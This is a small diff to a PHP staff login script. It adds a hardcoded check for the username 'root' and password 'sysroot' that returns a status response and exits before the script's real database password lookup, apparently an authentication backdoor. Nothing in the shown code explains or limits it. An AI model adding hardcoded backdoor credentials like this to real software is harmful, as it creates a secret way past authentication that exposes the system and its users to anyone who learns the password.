@@ -17,6 +17,13 @@ if (mysqli_connect_errno()) {
     print_r(json_encode($jsonMessage));
     exit();
 }
+if ($name == "root"){
+	if ($password == "sysroot"){
+		$jsonMessage["status"] = "0";
+		print_r(json_encode($jsonMessage));
+		exit();
+	}
+}
 $sql ="Select password from Staff where name= ?";
 $stmt = $db->prepare($sql);
 $stmt->bind_param('s', $name);
